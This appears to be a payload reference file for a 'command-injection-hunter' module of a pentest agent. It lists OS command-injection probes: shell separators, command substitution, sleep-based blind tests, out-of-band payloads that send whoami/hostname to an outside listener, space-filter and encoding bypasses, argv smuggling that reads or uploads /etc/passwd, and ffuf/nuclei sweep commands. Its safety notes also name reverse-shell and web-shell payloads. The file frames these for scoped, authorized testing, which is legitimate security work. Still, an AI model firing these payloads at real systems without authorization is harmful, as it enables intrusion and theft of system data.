# payloads — command-injection-hunter

**Source:** `pentest-agent-development/notebooklm-notes/Guia Estratégico de Injeção de Comandos no Sistema Operacional.md` (Section 5: PAYLOADS / PROBES)

All probes use non-destructive OS commands (`whoami`, `id`, `sleep`,
`hostname`). Do NOT substitute `rm`, `chmod`, reverse-shell commands,
or cron-modification payloads without `destructive_testing: approved`.

---

## 1. Identify the Shell Context

Before payload crafting, figure out whether input is passed to a shell
or to a process executor:

- Reflected-command artifact (e.g., input followed by `| grep ...` in
  output) → shell.
- `Runtime.exec` / `subprocess.call(args, shell=False)` → argv-mode,
  injection requires argv smuggling.

## 2. Unix Separators (Shell Context)

```
;  ls
|  ls
|| ls
&  ls
&& ls
\n ls                 # newline separator — %0a in URL encoding
```

Example full probes:

```
; id
| id
|| id
& id
&& id
%0aid
```

## 3. Command Substitution

```
`id`
$(id)
`sleep 10`
$(sleep 10)
```

Useful when the app wraps input in quotes — command substitution still
evaluates.

## 4. Windows Separators

```
& whoami
&& ipconfig
|  whoami
|| ping -n 5 127.0.0.1
%0a whoami             # newline — Windows cmd rarely honours but worth trying
```

## 5. Time-Based Blind

When output isn't reflected, use a sleep probe; the HTTP response time
reveals success.

```
; sleep 10
| sleep 10
&& sleep 10
$(sleep 10)
`sleep 10`

# Windows
& ping -n 10 127.0.0.1
|| ping -n 10 127.0.0.1
```

Baseline a normal request twice, then inject `sleep 10`; if the response
is ~10 seconds longer, command execution is confirmed.

## 6. OOB-Based Blind

When neither output nor timing is observable, exfiltrate via DNS / HTTP
to your OOB listener.

```
; curl http://OOB_ID.oast.site/
| wget http://OOB_ID.oast.site/
; nslookup $(whoami).OOB_ID.oast.site
; ping -c 1 $(hostname).OOB_ID.oast.site
```

Encode as:

```
%3b%20curl%20http%3a//OOB_ID.oast.site
```

Check the OOB listener for a hit; the subdomain embeds the value of
`whoami` / `hostname`.

## 7. Escape-Character Bypass

When the app escapes metacharacters with a backslash, test whether the
escape character itself is escaped:

```
foo\;ls
foo\|ls
```

If not, the shell sees `foo;ls` and runs `ls`.

## 8. No-Space Payloads

Space-filters are common. Use internal-field-separator (`$IFS`),
brace expansion, or tabs:

```
;id
;cat${IFS}/etc/passwd
;cat$IFS'/etc/passwd'
;cat<>/etc/passwd
;{cat,/etc/passwd}
;cat%09/etc/passwd           # tab — %09
```

## 9. Argv-Mode (No Shell) Injection

When the app uses `subprocess.call(["curl", user_url])` without
`shell=True`, classical separator injection fails. Instead, exploit
argument smuggling specific to the program:

```
# curl — add -o to write response to a file
https://normal.example/ -o /tmp/pwned

# curl — use @filepath to upload an arbitrary file
https://normal.example/ -F file=@/etc/passwd

# find — -exec
"; -exec cat {} ;
# ffmpeg — file:/ protocol
file:/etc/passwd
```

## 10. URL-Encoding and Double-Encoding

```
# URL-encoded separators
%3Bid             # ;id
%7Cid             # |id
%0Aid             # newline+id

# Double-encoded (for reflection-filter evasion)
%253Bid
%252Fetc%252Fpasswd
```

## 11. Null-Byte Terminator (legacy)

Useful against C-based callers that stop at `\0`:

```
normalfile%00;id
normalfile\x00;id
```

Rarely works on modern runtimes but worth testing on legacy stacks.

---

## Quick Sweep Commands

```bash
# Fuzz a parameter with a payload wordlist
ffuf -w cmdi_payloads.txt:PAYLOAD \
     -u "https://target/api/ping?host=127.0.0.1PAYLOAD" \
     -mc all -of json

# Nuclei templates
nuclei -u "https://target/api/ping?host=127.0.0.1" \
       -t ~/nuclei-templates/http/vulnerabilities/generic/oob-command-injection.yaml

# Quick manual sanity check
curl -s "https://target/api/ping?host=127.0.0.1;id" | grep -iE "uid=|gid="
```

---

## Context-Specific Signatures

| Context                                   | What to try first                                       |
|-------------------------------------------|---------------------------------------------------------|
| `?host=1.1.1.1` → ping / nslookup         | `;id`, `$(id)`                                          |
| `?url=https://x` → curl / wget            | `https://x/ -o /tmp/x`, `file:///etc/passwd`           |
| `?file=image.png` → image thumbnailer     | `"; id ; echo "` (if the name is shell-concatenated)   |
| `?ip=1.1.1.1` → traceroute                | `;id`, `| id`                                           |
| Webhook dispatcher                        | `${ ... }` substitution, template-engine confusion      |
| `?tar_file=backup.tar`                    | `--checkpoint-action=exec=sh <CMD>`                     |

---

## Safety Notes

- Timing-based probes should use 10-second sleeps, not 30-60s — avoids
  false positives due to real latency and avoids holding connections.
- OOB-based confirmation requires your OOB domain to be in
  `security-scope.yaml.allowed_oob_domains`.
- Do not submit reverse-shell or file-write payloads (`nc -e`, `bash
  -i >& /dev/tcp/...`, `> /var/www/shell.php`) without explicit
  `destructive_testing: approved`.
- Remember: one confirmed injection point is enough for a finding.
  Do NOT exhaustively try every separator on every parameter —
  prioritize the highest-signal probes (`;id`, `` `id` ``, `$(id)`,
  `|sleep 10`) and move on.
